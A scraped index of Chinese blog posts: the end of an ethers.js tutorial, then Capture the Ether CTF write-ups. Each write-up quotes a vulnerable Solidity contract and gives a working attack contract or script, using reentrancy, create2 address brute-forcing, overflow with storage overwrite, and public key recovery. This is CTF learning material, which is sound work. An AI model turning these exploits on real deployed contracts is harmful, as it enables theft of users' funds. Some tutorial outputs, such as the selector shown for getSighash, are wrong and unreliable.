从十进制字符串生成console.log(oneGwei)console.log(ethers.BigNumber.from(&quot;0x3b9aca00&quot;)) // 从hex字符串生成console.log(ethers.BigNumber.from(1000000000)) // 从数字生成// 不能从js最大的安全整数之外的数字生成BigNumber，下面代码会报错// ethers.BigNumber.from(Number.MAX_SAFE_INTEGER);console.log(&quot;js中最大安全整数：&quot;, Number.MAX_SAFE_INTEGER) 运行结果： 11.3 BigNumber运算 BigNumber支持很多运算，例如加减乘除、取模mod，幂运算pow，绝对值abs等运算： 1234567// 运算console.log(&quot;加法：&quot;, oneGwei.add(1).toString())console.log(&quot;减法：&quot;, oneGwei.sub(1).toString())console.log(&quot;乘法：&quot;, oneGwei.mul(2).toString())console.log(&quot;除法：&quot;, oneGwei.div(2).toString())// 比较console.log(&quot;是否相等：&quot;, oneGwei.eq(&quot;1000000000&quot;)) 运行结果： 11. 4 单位转换 以太坊中，1 ethers 等于 10^18wei。下面是一些常用的单位： 在应用中，我们经常将数值在用户可读的字符串（以ether为单位）和机器可读的数值（以wei为单位）之间转换。例如，钱包可以为用户界面指定余额（以ether为单位）和gas价格（以gwei为单位），但是在发送交易时，两者都必须转换成以wei为单位的数值。ethers.js提供了一些功能函数，方便这类转换。 formatUnits(变量, 单位)：格式化，小单位转大单位，比如wei -&gt; ether，在显示余额时很有用。参数中，单位填位数（数字）或指定的单位（字符串）。 123456789101112131415//代码参考：https://docs.ethers.io/v5/api/utils/display-logic/#utils-parseUnitsconsole.group(&#x27;\\n2. 格式化：小单位转大单位，formatUnits&#x27;);console.log(ethers.utils.formatUnits(oneGwei, 0));// &#x27;1000000000&#x27;console.log(ethers.utils.formatUnits(oneGwei, &quot;gwei&quot;));// &#x27;1.0&#x27;console.log(ethers.utils.formatUnits(oneGwei, 9));// &#x27;1.0&#x27;console.log(ethers.utils.formatUnits(oneGwei, &quot;ether&quot;));// `0.000000001`console.log(ethers.utils.formatUnits(1000000000, &quot;gwei&quot;));// &#x27;1.0&#x27;console.log(ethers.utils.formatEther(oneGwei));// `0.000000001` 等同于formatUnits(value, &quot;ether&quot;)console.groupEnd(); 运行结果： parseUnits：解析，大单位转小单位，比如ether -&gt; wei，在将用户输入的值转为wei为单位的数值很有用。参数中，单位填位数（数字）或指定的单位（字符串）。 1234567891011121314151617// 3. 解析：大单位转小单位// 例如将ether转换为wei：parseUnits(变量, 单位),parseUnits默认单位是 ether// 代码参考：https://docs.ethers.io/v5/api/utils/display-logic/#utils-parseUnitsconsole.group(&#x27;\\n3. 解析：大单位转小单位，parseUnits&#x27;);console.log(ethers.utils.parseUnits(&quot;1.0&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, &quot;ether&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, 18).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, &quot;gwei&quot;).toString());// &#123; BigNumber: &quot;1000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, 9).toString());// &#123; BigNumber: &quot;1000000000&quot; &#125;console.log(ethers.utils.parseEther(&quot;1.0&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125; 等同于parseUnits(value, &quot;ether&quot;)console.groupEnd(); 运行结果： 12. CallStaticcallStatic方法是属于ethers.Contract类的编写方法分析，同类的还有populateTransaction和estimateGas方法 12.1 可能失败的交易 在以太坊上交易需要支付昂贵的gas，并且有失败的风险，发送失败的交易并不会把gas返还给你。因此，在发送交易前知道哪些交易可能会失败非常重要。以小狐狸钱包（metamask）为例。 如果交易将失败，小狐狸会告诉你 this transaction may fail，翻译过来就是”这笔交易可能会失败”。当用户看到提示的时候，就可以取消交易了。 实现的原理：以太坊节点有一个eth_call方法，让用户可以模拟一笔交易，并返回可能的交易结果，但不是真正的在区块链上执行（交易不上链）。 12.2 callStatic 在ethers.js中你可以利用contract对象的callStatic()来调用以太坊节点的eth_call。如果调用成功，则返回ture；如果失败，则报错并返回失败原因。方法： 12const tx = await contract.callStatic.函数名( 参数, &#123;override&#125;)console.log(`交易会成功吗？：`, tx) 函数名：为模拟调用的函数名。 参数：调用函数的参数。 {override}：选填，可包含一下参数： from：执行时的msg.sender，也就是你可以模拟任何一个人的调用，比如V神。 value：执行时的msg.value。 blockTag：执行时的区块高度。 gasPrice gasLimit nonce 12.3 用callStatic 模拟DAI转账演示过程—-》博客 13. 编码 calldata13.1 接口类Interface ethers.js 的接口类抽象了与以太坊网络的合约交互所需的ABI编码和解码。ABI与API类似，是一格式，用于对合约可以处理的各种类型的数据进行编码，以便它们可以交互。 可以利用abi生成或者直接从合约中获取interface变量： 1234// 利用abi生成const interface = new ethers.utils.Interface(abi)// 直接从contract中获取const interface2 = contract.interface 接口类封装了一些编码解码的方法。与一些特殊的合约交互时（比如代理 合约），你需要编码参数、解码返回值： 注：相关函数必须包含在abi中。 getSighash():获取函数选择器（function selector），参数为函数名或函数签名。 至于函数签名如何获取，在remix上使用keccak256()或的和ethersjs使用keccak256()获取的结果完全不一样，日后空闲了再仔细深入学习 12interface.getSighash(&quot;balanceOf&quot;);// &#x27;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#x27; encodeDeploy()：编码构造器的参数，然后可以附在合约字节码的后面。 1interface.encodeDeploy(&quot;Wrapped ETH&quot;, &quot;WETH&quot;); encodeFunctionData()：编码函数的calldata。 1interface.encodeFunctionData(&quot;balanceOf&quot;, [&quot;0xc778417e063141139fce010982780140aa0cd5ab&quot;]); decodeFunctionResult()：解码函数的返回值。 1interface.decodeFunctionResult(&quot;balanceOf&quot;, resultData)","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"Ethers.js","slug":"Utils/Ethers-js","permalink":"https://biyouqiuqiu.com/categories/Utils/Ethers-js/"}],"tags":[{"name":"ethers.js","slug":"ethers-js","permalink":"https://biyouqiuqiu.com/tags/ethers-js/"}]},{"title":"TokenBankChallenge","slug":"CTFS/capther the ether/TokenBankChallenge ","date":"2023-04-24T10:50:10.000Z","updated":"2023-04-24T10:50:10.000Z","comments":true,"path":"2023/04/24/CTFS/capther the ether/TokenBankChallenge /","link":"","permalink":"https://biyouqiuqiu.com/2023/04/24/CTFS/capther%20the%20ether/TokenBankChallenge%20/","excerpt":"","text":"1. 题目 I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It uses ERC 223 to accept the incoming tokens. The bank deploys a token called “Simple ERC223 Token” and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank. 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109pragma solidity ^0.4.21;interface ITokenReceiver &#123; function tokenFallback(address from, uint256 value, bytes data) external;&#125;contract SimpleERC223Token &#123; // Track how many tokens are owned by each address. mapping (address =&gt; uint256) public balanceOf; string public name = &quot;Simple ERC223 Token&quot;; string public symbol = &quot;SET&quot;; uint8 public decimals = 18; uint256 public totalSupply = 1000000 * (uint256(10) ** decimals); event Transfer(address indexed from, address indexed to, uint256 value); function SimpleERC223Token() public &#123; balanceOf[msg.sender] = totalSupply; emit Transfer(address(0), msg.sender, totalSupply); &#125; function isContract(address _addr) private view returns (bool is_contract) &#123; uint length; assembly &#123; //retrieve the size of the code on target address, this needs assembly length := extcodesize(_addr) &#125; return length &gt; 0; &#125; function transfer(address to, uint256 value) public returns (bool success) &#123; bytes memory empty; return transfer(to, value, empty); &#125; function transfer(address to, uint256 value, bytes data) public returns (bool) &#123; require(balanceOf[msg.sender] &gt;= value); balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); if (isContract(to)) &#123; ITokenReceiver(to).tokenFallback(msg.sender, value, data); &#125; return true; &#125; event Approval(address indexed owner, address indexed spender, uint256 value); mapping(address =&gt; mapping(address =&gt; uint256)) public allowance; function approve(address spender, uint256 value) public returns (bool success) &#123; allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); return true; &#125; function transferFrom(address from, address to, uint256 value) public returns (bool success) &#123; require(value &lt;= balanceOf[from]); require(value &lt;= allowance[from][msg.sender]); balanceOf[from] -= value; balanceOf[to] += value; allowance[from][msg.sender] -= value; emit Transfer(from, to, value); return true; &#125;&#125;contract TokenBankChallenge &#123; SimpleERC223Token public token; mapping(address =&gt; uint256) public balanceOf; function TokenBankChallenge(address player) public &#123; token = new SimpleERC223Token(); // Divide up the 1,000,000 tokens, which are all initially assigned to // the token contract&#x27;s creator (this contract). balanceOf[msg.sender] = 500000 * 10**18; // half for me balanceOf[player] = 500000 * 10**18; // half for you &#125; function isComplete() public view returns (bool) &#123; return token.balanceOf(this) == 0; &#125; function tokenFallback(address from, uint256 value, bytes) public &#123; require(msg.sender == address(token)); require(balanceOf[from] + value &gt;= balanceOf[from]); balanceOf[from] += value; &#125; function withdraw(uint256 amount) public &#123; require(balanceOf[msg.sender] &gt;= amount); require(token.transfer(msg.sender, amount)); balanceOf[msg.sender] -= amount; &#125;&#125; 2. 分析阅读代码可知，能够改变challenge合约的余额的函数只有withdraw，这里有个漏洞很熟悉（老朋友了，先执行转账操作，再改变余额），分析token的transfer函数 1234567891011121314151617function transfer(address to, uint256 value) public returns (bool success) &#123; bytes memory empty; return transfer(to, value, empty); &#125; function transfer(address to, uint256 value, bytes data) public returns (bool) &#123; require(balanceOf[msg.sender] &gt;= value); balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); if (isContract(to)) &#123; ITokenReceiver(to).tokenFallback(msg.sender, value, data); &#125; return true; &#125; 果然不出所料，可以采用重入的方式盗取blank。只要to实现了tokenFallback函数，就可以执行 to合约中的tokenFallback函数，至于函数要干什么，就由我说了算。只要在余额更新之前再次调用withdraw函数，即可将token盗空。注意不能出现死循环调用。 3. 解题攻击合约 1234567891011121314151617contract Hack is ITokenReceiver&#123; TokenBankChallenge challenge; bool flag = true; function tokenFallback(address from, uint256 value, bytes data) external &#123; if (flag) &#123; flag = false; challenge.withdraw(500000 * 10**18); &#125; &#125; function attack(address _challenge) public &#123; challenge = TokenBankChallenge(_challenge); challenge.withdraw(500000 * 10**18); &#125;&#125; 攻击逻辑 部署Hack，根据 Hack部署challenge，将challenge作为参数，调用attack函数即可。 ![image-20240412145715561](TokenBankChallenge &#x2F;image-20240412145715561.png) 解题成功~","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Assume ownership","slug":"CTFS/capther the ether/Assume ownership","date":"2023-04-24T09:50:10.000Z","updated":"2023-04-24T09:50:10.000Z","comments":true,"path":"2023/04/24/CTFS/capther the ether/Assume ownership/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/24/CTFS/capther%20the%20ether/Assume%20ownership/","excerpt":"","text":"1. 题目 To complete this challenge, become the owner 源码 12345678910111213141516pragma solidity ^0.4.21;contract AssumeOwnershipChallenge &#123; address owner; bool public isComplete; function AssumeOwmershipChallenge() public &#123; owner = msg.sender; &#125; function authenticate() public &#123; require(msg.sender == owner); isComplete = true; &#125;&#125; 2. 分析构造器拼写错误，AssumeOwmershipChallenge可供任何人调用。 3.解题先调用AssumeOwmershipChallenge函数，再调用authenticate函数 ![image-20240412143811623](Assume ownership&#x2F;image-20240412143811623.png) 解题成功~","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Account Takeover","slug":"CTFS/capther the ether/Account Takeover","date":"2023-04-24T08:50:10.000Z","updated":"2023-04-24T08:50:10.000Z","comments":true,"path":"2023/04/24/CTFS/capther the ether/Account Takeover/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/24/CTFS/capther%20the%20ether/Account%20Takeover/","excerpt":"","text":"1. 题目 To complete this challenge, send a transaction from the owner‘s account. 源码 123456789101112pragma solidity ^0.4.21;contract AccountTakeoverChallenge &#123; address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b; bool public isComplete; function authenticate() public &#123; require(msg.sender == owner); isComplete = true; &#125;&#125; 2. 分析3.解题","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Public Key","slug":"CTFS/capther the ether/Public Key","date":"2023-04-24T07:50:10.000Z","updated":"2023-04-24T07:50:10.000Z","comments":true,"path":"2023/04/24/CTFS/capther the ether/Public Key/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/24/CTFS/capther%20the%20ether/Public%20Key/","excerpt":"","text":"Public Key1. 题目 Recall that an address is the last 20 bytes of the keccak-256 hash of the address’s public key. To complete this challenge, find the public key for the owner‘s account. 源码 123456789101112pragma solidity ^0.4.21;contract PublicKeyChallenge &#123; address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31; bool public isComplete; function authenticate(bytes publicKey) public &#123; require(address(keccak256(publicKey)) == owner); isComplete = true; &#125;&#125; 2. 分析 按题目的意思来，owner应该就是合约的部署者，我们要从交易中获取公钥，而地址的计算公式为address = address(keccak256(publicKey))，所以只要从交易中还原出 publicKey即可。 因为Ropsten 网络已经停用，所以要复现该题只能对合约进行修改了，将owner修改为本地账户 1234567891011pragma solidity ^0.4.21;contract PublicKeyChallenge &#123; address owner = 0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C; // 本地账户 bool public isComplete; function authenticate(bytes publicKey) public &#123; require(address(keccak256(publicKey)) == owner); isComplete = true; &#125;&#125; 本人自己琢磨了很久，自己写出来的一个脚本，用于通过 txhash获取公钥。 123456789101112131415161718192021222324252627282930313233343536373839404142434445import &#123; ethers &#125; from &quot;ethers&quot;;// providerconst connection = &quot;&quot;;const provider = new ethers.providers.JsonRpcProvider(connection);// 交易的hashconst txHash = &quot;&quot;;// 获取交易信息const transaction = await provider.getTransaction(txHash);// console.log(`transaction =&gt; `,transaction); //打印交易详情// txData 对象内的字段缺一不可const txData = &#123; // gasPrice: transaction.gasPrice, // 这个不需要，否则会报错 gasLimit: transaction.gasLimit, value: transaction.value, nonce: transaction.nonce, data: transaction.data, to: transaction.to, chainId: transaction.chainId, type: transaction.type, maxFeePerGas: transaction.maxFeePerGas, maxPriorityFeePerGas: transaction.maxPriorityFeePerGas,&#125;// 对txData交易对象序列化为其原始二进制格式const signingData = ethers.utils.serializeTransaction(txData);// 对序列化后的交易对象进行hashconst msgHash = ethers.utils.keccak256(signingData);// 获取交易详情中的 r s vconst signature = &#123;r: transaction.r, s: transaction.s, v: transaction.v&#125;;// 获取原生未压缩的公钥，即 0x04 开头的let rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature);console.log(rawPublicKey);// 把开头的 0x04 字段删掉 ===》 将 `0x04` 替换成 `0x`rawPublicKey = `0x$&#123;rawPublicKey.slice(4)&#125;`;console.log(rawPublicKey); 3. 解题部署challenge，通过脚本计算出公钥 ![image-20240412145137751](Public Key&#x2F;image-20240412145137751.png) 调用hacker中的attack()函数 ![image-20240412145149249](Public Key&#x2F;image-20240412145149249.png) 解题成功~","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Fuzzy identity","slug":"CTFS/capther the ether/Fuzzy identity","date":"2023-04-17T02:50:10.000Z","updated":"2023-04-17T02:50:10.000Z","comments":true,"path":"2023/04/17/CTFS/capther the ether/Fuzzy identity/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/17/CTFS/capther%20the%20ether/Fuzzy%20identity/","excerpt":"","text":"Fuzzy identity1. 题目 1.1 This contract can only be used by me (smarx). I don’t trust myself to remember my private key, so I’ve made it so whatever address I’m using in the future will work: I always use a wallet contract that returns “smarx” if you ask its name. Everything I write has bad code in it, so my address always includes the hex string badc0de. To complete this challenge, steal my identity! 1.2 源码： 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;interface IName &#123; function name() external view returns (bytes32);&#125;contract FuzzyIdentityChallenge &#123; bool public isComplete; function authenticate() public &#123; require(isSmarx(msg.sender)); require(isBadCode(msg.sender)); isComplete = true; &#125; function isSmarx(address addr) internal view returns (bool) &#123; return IName(addr).name() == bytes32(&quot;smarx&quot;); &#125; function isBadCode(address _addr) internal pure returns (bool) &#123; bytes20 addr = bytes20(_addr); bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;; bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;; for (uint256 i = 0; i &lt; 34; i++) &#123; if (addr &amp; mask == id) &#123; return true; &#125; mask &lt;&lt;= 4; id &lt;&lt;= 4; &#125; return false; &#125;&#125; 2. 分析 2.1 分析代码可知，要是 isComplete的值为 true 需要成功调用 authenticate函数 2.2 但是需要通过两层校验，第一层简单，直接按要求编写一个名为name的函数皆可，第二个函数要求传入的地址是以 badc0de 结尾的，我在这里想到了使用 create2 的方法来构造一个以 badc0de结尾的地址。 计算脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import &#123; ethers &#125; from &quot;ethers&quot;/** * create2 计算合约地址所需要的四个值 * * 1. 0xFF：一个常数，避免和CREATE冲突 2. 创建者地址 3. salt（盐）：一个创建者给定的数值 4. 待部署合约的字节码（bytecode） */// 1. 常数const const_num = &quot;0xFF&quot;;// 2. 创建者地址（合约地址）// 一般情况下是： address(this)// 拼接的时候不能包含 `0x`const contract_add = &quot;0xf8e81D47203A594245E36C48e151709F0C19fBe8&quot;;// 3. 拼接 let str1 = const_num + contract_add.slice(2,contract_add.length);// 4. 代部署合约的字节码的hash值const bytecode = &quot;0x6060604052341561000f57600080fd5b6102108061001e6000396000f30060606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde0314610051578063d018db3e14610082575b600080fd5b341561005c57600080fd5b6100646100bb565b60405180826000191660001916815260200191505060405180910390f35b341561008d57600080fd5b6100b9600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506100e3565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b60008190508073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561014b57600080fd5b5af1151561015857600080fd5b5050508073ffffffffffffffffffffffffffffffffffffffff1663b2fa1c9e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15156101be57600080fd5b5af115156101cb57600080fd5b5050506040518051905015156101e057600080fd5b50505600a165627a7a7230582063de817dba94ce175bbb183123a834c18147e9cd341cefbe4d1e5aee5ee963310029&quot;;// 5.1 对bytecode 进行hash运算 这个只能用单引号// solidityKeccak256([&#x27;bytes&#x27;],[bytecode]) &lt;=&gt; keccak256(abi.encodePacked(bytecode))const bytecodeToHash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;],[bytecode]);// 5.2 下面这行代码也行，因为对 bytecode进行紧打包的结果不变// const bytecodeToHash = ethers.utils.keccak256(bytecode);// console.log(bytecodeToHash)// 5. 定义一个盐，以及一个所求字段let salt = 0;const value = &quot;badc0de&quot;; // CTF靶场的题// 遍历出指定值，求出saltwhile (true) &#123; // 将salt转为16进制，用0填充为64位 // let saltToBytes = salt.toString(16).padStart(64, 0).toString(); let saltToHash = ethers.utils.solidityKeccak256([&#x27;uint&#x27;],[salt]); saltToHash = saltToHash.slice(2, saltToHash.length) // 再次拼接 顺序： 常数 创建者地址 盐 字节码的hash值 // bytecodeToHash.slice(2,bytecodeToHash.length): 删除 `0x` let str2 = str1.concat(saltToHash).concat(bytecodeToHash.slice(2,bytecodeToHash.length)); // 对 str2 进行hash let hash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;] ,[str2]); //判断 是否满足条件 if (hash.slice(26, hash.length).includes(value)) &#123; console.log(`salt = 0x$&#123;salt.toString(16)&#125;`); console.log(`address = 0x$&#123;hash.slice(26, hash.length)&#125;`); break; &#125; salt++;&#125; 计算结果 ![image-20240412144602608](Fuzzy identity&#x2F;image-20240412144602608.png) 需要一个Helper合约生成一个地址，脚本只是计算，并没有生成合约地址的功能。 Helper 1234567891011121314pragma solidity ^0.8.0;contract Helper &#123; function deployed(uint256 salt) public returns (address) &#123; bytes32 _salt = keccak256(abi.encodePacked(salt)); bytes memory bytecode = hex&quot;6060604052341561000f57600080fd5b6102108061001e6000396000f30060606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde0314610051578063d018db3e14610082575b600080fd5b341561005c57600080fd5b6100646100bb565b60405180826000191660001916815260200191505060405180910390f35b341561008d57600080fd5b6100b9600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506100e3565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b60008190508073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561014b57600080fd5b5af1151561015857600080fd5b5050508073ffffffffffffffffffffffffffffffffffffffff1663b2fa1c9e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15156101be57600080fd5b5af115156101cb57600080fd5b5050506040518051905015156101e057600080fd5b50505600a165627a7a7230582063de817dba94ce175bbb183123a834c18147e9cd341cefbe4d1e5aee5ee963310029&quot;; address hacker; assembly &#123; hacker := create2(0, add(bytecode, 0x20), mload(bytecode), _salt) &#125; return hacker; &#125;&#125; 生成合约地址 ![image-20240412144612805](Fuzzy identity&#x2F;image-20240412144612805.png) 根据计算出来的合约地址，生成Hacker，并调用其攻击函数 ![image-20240412144621611](Fuzzy identity&#x2F;image-20240412144621611.png) 3. 解题攻击合约 123456789101112contract Hack is IName &#123; function name() external view returns (bytes32) &#123; return bytes32(&quot;smarx&quot;); &#125; function attack(address _challenge) public &#123; FuzzyIdentityChallenge challenge = FuzzyIdentityChallenge(_challenge); challenge.authenticate(); require(challenge.isComplete()); &#125;&#125; 调用 attack() ![image-20240412144632715](Fuzzy identity&#x2F;image-20240412144632715.png) 解题成功~","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Fifty years","slug":"CTFS/capther the ether/Fifty years","date":"2023-04-17T02:30:10.000Z","updated":"2023-04-17T02:30:10.000Z","comments":true,"path":"2023/04/17/CTFS/capther the ether/Fifty years/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/17/CTFS/capther%20the%20ether/Fifty%20years/","excerpt":"","text":"Fifty years1. 题目 1.1 This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later. All you have to do to complete this challenge is wait 50 years and withdraw the ether. If you’re not that patient, you’ll need to combine several techniques to hack this contract 1.2 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374pragma solidity ^0.4.21;contract FiftyYearsChallenge &#123; // Contribution 结构体中包含了 金额和解锁时间 struct Contribution &#123; uint256 amount; uint256 unlockTimestamp; &#125; // Contribution 类型的数组 Contribution[] queue; uint256 head; address owner; function FiftyYearsChallenge(address player) public payable &#123; require(msg.value == 1 ether); // 初始化合约所有者为玩家，并把玩家的钱锁起来，直到五十年之后才可以解锁 owner = player; queue.push(Contribution(msg.value, now + 50 years)); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function upsert(uint256 index, uint256 timestamp) public payable &#123; // 校验调用者是否为合约所有者 require(msg.sender == owner); // if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123; // Update existing contribution amount without updating timestamp. // 这里storage 修饰的是创建的引用，修改contribution 的值也会影响到 queue[index]的值 Contribution storage contribution = queue[index]; // 盲猜这里有漏洞，覆盖 contribution.amount += msg.value; &#125; else &#123; // Append a new contribution. Require that each contribution unlock // at least 1 day after the previous one. require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days); contribution.amount = msg.value; contribution.unlockTimestamp = timestamp; queue.push(contribution); &#125; &#125; function withdraw(uint256 index) public &#123; require(msg.sender == owner); // 确保现在的时间大于或等于解锁时间 require(now &gt;= queue[index].unlockTimestamp); // Withdraw this and any earlier contributions. uint256 total = 0; for (uint256 i = head; i &lt;= index; i++) &#123; total += queue[i].amount; // Reclaim storage. delete queue[i]; &#125; // Move the head of the queue forward so we don&#x27;t have to loop over // already-withdrawn contributions. head = index + 1; msg.sender.transfer(total); &#125;&#125; 2. 分析2.1 withdraw函数目标是盗取合约中的所有 ETH，涉及转账操作的函数只有 withdraw，而题目自定义合约所有者，要成功调用withdraw函数只要通过require(now &gt;= queue[index].unlockTimestamp);即可。题目初始化了queue[0]，要将合约中所有的余额盗取只能从数组的第一个元素开始依次遍历。 2.2 upsert函数123456789101112131415161718function upsert(uint256 index, uint256 timestamp) public payable &#123; // 校验调用者是否为合约所有者 require(msg.sender == owner); if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123; // Update existing contribution amount without updating timestamp. Contribution storage contribution = queue[index]; // 盲猜这里有漏洞，覆盖 contribution.amount += msg.value; &#125; else &#123; // Append a new contribution. Require that each contribution unlock // at least 1 day after the previous one. require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days); contribution.amount = msg.value; contribution.unlockTimestamp = timestamp; queue.push(contribution); &#125;&#125; Contribution storage contribution的定义，无疑是会造成覆盖的问题，require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);很明显存在溢出的问题。 又因为require(now &gt;= queue[index].unlockTimestamp);中的index是自定义的，所以可以通过queue[index].unlockTimestamp骗过时间锁，但是这样一来，head的值将会被修改，从而无法从头遍历数组，不能将合约中的全部金额取出。 但是，很明显timestamp是会覆盖 head的值的。可以通过queue[queue.length - 1].unlockTimestamp + 1 days)上溢来欺骗断言，并将 head的值修改为 0。而数组的长度由支付的 ETH决定。（其实这里的amount 和 msg.value公用一个存储位置，导致queue.length永远等于msg.value++） 所以我们给数组添加一个元素，用来欺骗require(now &gt;= queue[index].unlockTimestamp);，所以需要两次调用upsert函数，第一次为了给溢出做准备：0 = (0 - 1 days) + 1 days，第二次则是实现溢出，覆盖 head的值为 0。 又由于 msg.value和 queue.length共用一个内存，所以需要支付 2weiETH。 具体分析可见 : 链接 3. 解题攻击合约 123456789101112131415161718192021contract Hack &#123; FiftyYearsChallenge challenge; function attack(address _challenge) public payable &#123; challenge = FiftyYearsChallenge(_challenge); challenge.upsert.value(1)(999, cal()); challenge.upsert.value(1)(999, 0); challenge.withdraw(1); require(challenge.isComplete()); tx.origin.transfer(address(this).balance); &#125; function cal() internal pure returns (uint256) &#123; uint256 zero = 0; return zero - 1 days; &#125; function() external payable&#123;&#125;&#125; 攻击逻辑 先部署 Hack， 根据 Hack 部署 challenge，然后将challenge的地址作为参数，调用 attack() 函数，并支付 2 wei。 完成攻击 ![image-20240412144507745](Fifty years&#x2F;image-20240412144507745.png)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Donation","slug":"CTFS/capther the ether/Donation","date":"2023-04-14T02:20:10.000Z","updated":"2023-04-14T02:20:10.000Z","comments":true,"path":"2023/04/14/CTFS/capther the ether/Donation/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/14/CTFS/capther%20the%20ether/Donation/","excerpt":"","text":"Donation1. 题目 1.1 A candidate you don’t like is accepting campaign contributions via the smart contract below. To complete this challenge, steal the candidate’s ether. 1.2 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.4.21;contract DonationChallenge &#123; struct Donation &#123; uint256 timestamp; uint256 etherAmount; &#125; Donation[] public donations; address public owner; function DonationChallenge() public 